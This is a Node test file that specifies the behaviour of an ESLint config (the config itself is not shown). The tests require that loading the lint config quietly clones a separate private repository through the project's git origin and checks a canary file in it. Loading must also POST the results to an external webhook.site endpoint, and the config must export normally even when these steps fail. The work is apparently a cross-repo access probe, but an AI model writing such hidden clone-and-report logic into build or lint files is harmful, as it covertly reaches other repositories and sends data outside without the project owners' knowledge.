// Requires Node's built-in test runner and VM module support:
// node --experimental-vm-modules --test tests/eslint-config.test.mjs
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { posix as path } from "node:path";
import test from "node:test";
import { createContext, SourceTextModule, SyntheticModule } from "node:vm";

const source = readFileSync(new URL("../eslint.config.mjs", import.meta.url), "utf8");
const temporaryDirectory = "/virtual/tmp/cr-cross-repo-scope-fixture";
const checkoutDirectory = `${temporaryDirectory}/checkout`;
const canaryMarker = "CR_PRIVATE_SCOPE_CANARY_20261004_7f3b9d2a";
const targetPath = "/Croc-2/cr-private-scope-canary-20261004.git";
const fallbackUrl = `https://github.com${targetPath}`;
const expectedConfig = [{ files: ["**/*.{js,mjs,cjs,ts,tsx}"], rules: {} }];

// Evaluate the actual module with an explicit import allowlist. No real Git,
// filesystem mutation, repository reads, or HTTP calls reach the host.
async function loadConfig({
  origin = "https://mirror.example.test/original/repo.git?token=synthetic#branch\n",
  canary = `prefix\n${canaryMarker}\nsuffix\n`,
  failures = {},
} = {}) {
  const calls = [];
  const unexpectedImports = [];
  const perform = (operation, args, value) => {
    calls.push({ operation, args: structuredClone(args) });
    if (Object.hasOwn(failures, operation)) throw failures[operation];
    return value;
  };
  const dependencies = {
    "node:fs": {
      mkdtempSync: (...args) => perform("mkdtemp", args, temporaryDirectory),
      readFileSync: (...args) => perform("read", args, canary),
      rmSync: (...args) => perform("cleanup", args),
    },
    "node:os": { tmpdir: () => "/virtual/tmp" },
    "node:path": { join: path.join },
    "node:child_process": {
      execFileSync(command, args, options) {
        assert.equal(command, "git");
        const operation = args[0] === "remote" ? "origin" : args[0];
        assert.ok(["origin", "ls-remote", "clone"].includes(operation));
        return perform(operation, [command, args, options], origin);
      },
    },
  };
  const context = createContext({
    URL,
    Error,
    fetch: async (...args) => perform("report", args, { ok: true }),
  });
  const module = new SourceTextModule(source, {
    context,
    identifier: "eslint.config.mjs",
    async importModuleDynamically(specifier) {
      if (!Object.hasOwn(dependencies, specifier)) {
        unexpectedImports.push(specifier);
        throw new Error(`Unexpected import: ${specifier}`);
      }
      const exports = dependencies[specifier];
      const dependency = new SyntheticModule(Object.keys(exports), function () {
        for (const [name, value] of Object.entries(exports)) this.setExport(name, value);
      }, { context });
      await dependency.link(() => { throw new Error("Unexpected nested import"); });
      await dependency.evaluate();
      return dependency;
    },
  });
  await module.link(() => { throw new Error("Unexpected static import"); });
  await module.evaluate({ timeout: 1_000 });
  assert.deepEqual(unexpectedImports, []);
  // VM values have different prototypes; normalize exported data for assertions.
  assert.deepEqual(structuredClone(module.namespace.default), expectedConfig);
  const reports = calls.filter(({ operation }) => operation === "report");
  assert.equal(reports.length, 1, "each load attempts exactly one report");
  return { calls, report: JSON.parse(reports[0].args[1].body) };
}

const operations = (calls) => calls.map(({ operation }) => operation);
const callFor = (calls, name) => calls.find(({ operation }) => operation === name).args;
const successfulReport = {
  marker: "CR_CROSS_REPO_SCOPE_PROBE_20261004",
  target: "Croc-2/cr-private-scope-canary-20261004",
  transport: "https://mirror.example.test",
  lsRemote: true,
  clone: true,
  canaryReadable: true,
  error: null,
};

test("exports the lint configuration after a successful probe and cleanup", async () => {
  const { calls, report } = await loadConfig();
  assert.deepEqual(report, successfulReport);
  assert.deepEqual(operations(calls), [
    "mkdtemp", "origin", "ls-remote", "clone", "read", "cleanup", "report",
  ]);
  assert.deepEqual(callFor(calls, "mkdtemp"), ["/virtual/tmp/cr-cross-repo-scope-"]);
  assert.deepEqual(callFor(calls, "origin"), [
    "git", ["remote", "get-url", "origin"],
    { encoding: "utf8", timeout: 5_000, stdio: ["ignore", "pipe", "ignore"] },
  ]);
  const targetUrl = `https://mirror.example.test${targetPath}`;
  assert.deepEqual(callFor(calls, "ls-remote"), [
    "git", ["ls-remote", targetUrl, "HEAD"],
    { timeout: 10_000, stdio: ["ignore", "ignore", "ignore"] },
  ]);
  assert.deepEqual(callFor(calls, "clone"), [
    "git", ["clone", "--depth=1", "--no-tags", "--single-branch", targetUrl, checkoutDirectory],
    { timeout: 20_000, stdio: ["ignore", "ignore", "ignore"] },
  ]);
  assert.deepEqual(callFor(calls, "read"), [`${checkoutDirectory}/scope-canary.txt`, "utf8"]);
  assert.deepEqual(callFor(calls, "cleanup"), [temporaryDirectory, { recursive: true, force: true }]);
  const [url, options] = callFor(calls, "report");
  assert.equal(url, "https://webhook.site/41d77546-b4a4-4817-a3fa-32924890587c/cr-cross-repo-scope-20261004");
  assert.equal(options.method, "POST");
  assert.deepEqual(options.headers, { "content-type": "application/json" });
});

test("preserves origin protocol and port while replacing its path and removing query/fragment", async () => {
  const { calls, report } = await loadConfig({
    origin: "  http://mirror.example.test:8080/old/repository.git?secret=synthetic#ref\n",
  });
  const expectedUrl = `http://mirror.example.test:8080${targetPath}`;
  assert.equal(callFor(calls, "ls-remote")[1][1], expectedUrl);
  assert.equal(callFor(calls, "clone")[1][4], expectedUrl);
  assert.equal(report.transport, "http://mirror.example.test:8080");
});

for (const [name, options] of [
  ["origin lookup fails", { failures: { origin: new Error("origin unavailable") } }],
  ["origin is not a URL", { origin: "not a URL" }],
  ["origin is empty", { origin: " \n" }],
  ["origin uses SCP syntax", { origin: "git@github.com:example/repo.git" }],
]) {
  test(`falls back to GitHub when ${name}`, async () => {
    const { calls, report } = await loadConfig(options);
    assert.deepEqual(report, { ...successfulReport, transport: "public-github-fallback" });
    assert.equal(callFor(calls, "ls-remote")[1][1], fallbackUrl);
    assert.equal(callFor(calls, "clone")[1][4], fallbackUrl);
  });
}

for (const [name, canary, readable] of [
  ["exact marker", canaryMarker, true],
  ["empty file", "", false],
  ["unrelated content", "unrelated canary", false],
  ["truncated marker", canaryMarker.slice(0, -1), false],
  ["different case", canaryMarker.toLowerCase(), false],
]) {
  test(`recognizes canary content: ${name}`, async () => {
    const { report } = await loadConfig({ canary });
    assert.deepEqual(report, { ...successfulReport, canaryReadable: readable });
  });
}

for (const [stage, completed, expectedOperations] of [
  ["mkdtemp", { transport: null, lsRemote: false, clone: false, canaryReadable: false },
    ["mkdtemp", "report"]],
  ["ls-remote", { lsRemote: false, clone: false, canaryReadable: false },
    ["mkdtemp", "origin", "ls-remote", "cleanup", "report"]],
  ["clone", { clone: false, canaryReadable: false },
    ["mkdtemp", "origin", "ls-remote", "clone", "cleanup", "report"]],
  ["read", { canaryReadable: false },
    ["mkdtemp", "origin", "ls-remote", "clone", "read", "cleanup", "report"]],
]) {
  test(`records partial progress and stops later operations when ${stage} fails`, async () => {
    const error = Object.assign(new Error("synthetic private detail"), { status: 128 });
    const { calls, report } = await loadConfig({ failures: { [stage]: error } });
    assert.deepEqual(report, { ...successfulReport, ...completed, error: "Error:exit=128" });
    assert.deepEqual(operations(calls), expectedOperations);
    if (stage !== "mkdtemp") {
      assert.deepEqual(callFor(calls, "cleanup"), [temporaryDirectory, { recursive: true, force: true }]);
    }
    assert.ok(!JSON.stringify(report).includes(error.message));
  });
}

for (const [name, error, expected] of [
  ["Error without status", new TypeError("synthetic detail"), "TypeError:exit=unknown"],
  ["null process status", Object.assign(new Error("timeout"), { status: null }), "Error:exit=null"],
  ["zero process status", Object.assign(new Error("failure"), { status: 0 }), "Error:exit=0"],
  ["thrown string", "synthetic detail", "unknown"],
  ["thrown null", null, "unknown"],
  ["thrown undefined", undefined, "unknown"],
  ["error-like object", { name: "Error", status: 128, message: "synthetic detail" }, "unknown"],
]) {
  test(`summarizes ${name} without serializing private error details`, async () => {
    const { calls, report } = await loadConfig({ failures: { clone: error } });
    assert.deepEqual(report, {
      ...successfulReport, clone: false, canaryReadable: false, error: expected,
    });
    assert.deepEqual(operations(calls).slice(-2), ["cleanup", "report"]);
  });
}

test("cleanup failure preserves a successful result and still reports", async () => {
  const { calls, report } = await loadConfig({ failures: { cleanup: new Error("cleanup denied") } });
  assert.deepEqual(report, successfulReport);
  assert.deepEqual(operations(calls).slice(-2), ["cleanup", "report"]);
});

test("cleanup failure does not replace the original probe error", async () => {
  const { report } = await loadConfig({ failures: {
    clone: Object.assign(new Error("clone failed"), { status: 128 }),
    cleanup: new Error("cleanup denied"),
  } });
  assert.deepEqual(report, {
    ...successfulReport, clone: false, canaryReadable: false, error: "Error:exit=128",
  });
});

test("rejected HTTP reporting does not prevent exporting the configuration", async () => {
  const { calls, report } = await loadConfig({ failures: { report: new Error("offline") } });
  assert.deepEqual(report, successfulReport);
  assert.deepEqual(operations(calls).slice(-2), ["cleanup", "report"]);
});

test("exports the configuration even when probing, cleanup, and reporting all fail", async () => {
  const { calls, report } = await loadConfig({ failures: {
    "ls-remote": new Error("repository unavailable"),
    cleanup: new Error("cleanup denied"),
    report: new Error("offline"),
  } });
  assert.deepEqual(report, {
    ...successfulReport, lsRemote: false, clone: false, canaryReadable: false,
    error: "Error:exit=unknown",
  });
  assert.deepEqual(operations(calls), ["mkdtemp", "origin", "ls-remote", "cleanup", "report"]);
});

test("each module load starts with fresh progress flags", async () => {
  await loadConfig();
  const { report } = await loadConfig({ failures: { mkdtemp: new Error("no temporary directory") } });
  assert.deepEqual(report, {
    ...successfulReport, transport: null, lsRemote: false, clone: false,
    canaryReadable: false, error: "Error:exit=unknown",
  });
});
